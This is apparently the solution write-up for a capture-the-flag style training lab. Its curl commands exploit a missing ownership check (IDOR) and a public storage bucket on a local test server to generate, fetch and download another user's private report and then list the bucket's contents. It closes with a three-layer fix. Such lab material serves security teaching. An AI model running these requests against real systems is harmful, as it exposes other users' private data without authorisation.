# SOLUTION — Lab-05

```bash
# 1) as alice, request a report for BOB's post (IDOR - no ownership check)
curl -X POST http://127.0.0.1:8005/api/reports/generate \
 -H "X-User: alice" -H "Content-Type: application/json" -d '{"postId":4}'
# -> {"backgroundJobId":"<UUID>",...}

# 2) fetch the result (no job-ownership check either)
curl -H "X-User: alice" http://127.0.0.1:8005/api/reports/result/<UUID>
# -> {"downloadUrl":"http://127.0.0.1:8005/s3-bucket/report/<UUID>.pdf"}

# 3) download with NO auth at all (public bucket)
curl http://127.0.0.1:8005/s3-bucket/report/<UUID>.pdf
# -> PRIVATE REPORT post=4 owner=bob ... FLAG{...}

# 4) zero-knowledge enumeration (ListBucket open)
curl "http://127.0.0.1:8005/s3-bucket/?list-type=2"
```

**Fix (3 layers):** ownership check before creating the job + ownership check before returning the result + private bucket with short-lived presigned URLs.
